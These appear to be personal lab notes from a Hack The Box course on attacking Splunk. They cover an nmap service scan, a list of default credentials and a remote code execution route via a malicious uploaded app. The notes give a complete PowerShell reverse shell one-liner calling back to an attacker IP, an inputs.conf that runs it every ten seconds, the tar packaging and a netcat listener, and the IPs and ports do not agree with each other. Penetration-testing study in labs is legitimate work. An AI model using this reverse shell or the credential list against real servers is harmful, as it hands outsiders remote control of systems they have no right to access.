# Splunk Discovery

## 1. Nmap Service Scan
Identify Splunk services (usually `Splunkd httpd`).
* **Target Ports:** 8000 (Web), 8089 (Management).
```bash
sudo nmap -sV -p 8000,8089 10.129.201.50
```

## 2. Default Credentials Checklist
* **Old Versions:** `admin:changeme`
* **New Versions:** `admin:admin`, `admin:Welcome`, `admin:Password123`, `admin:Welcome1`
* **Splunk Free:** No authentication required (Direct Admin Access).


# RCE
https://github.com/0xjpuff/reverse_shell_splunk

```
└──╼ [★]$ tree reverse_shell_splunk/
reverse_shell_splunk/
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner. which is the run.ps1

Input attacker IP and Attcker port, which is 10.10.14.46 and 443 (port for Netcat listener)

```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.45',1234);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};$client.Close()
```

This gives you a fully interactive **PowerShell shell** over TCP.

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

Attacking Splunk

```
Code4Christ@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Now tar these files up for the attack

Copy

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-1067736@htb-xsl2difyob]─[~/reverse_shell_splunk]
└──╼ [★]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
reverse_shell_splunk/
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
```

The next step is to choose `Install app from file` and upload the application.

go to the /en-US/manager/search/apps/local

![[Pasted image 20251230161559.png]]

Attacking Splunk

Copy

```
Code4Christ@htb[/htb]$ sudo nc -lnvp 1235

listening on [any] 443 ...
```

On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.
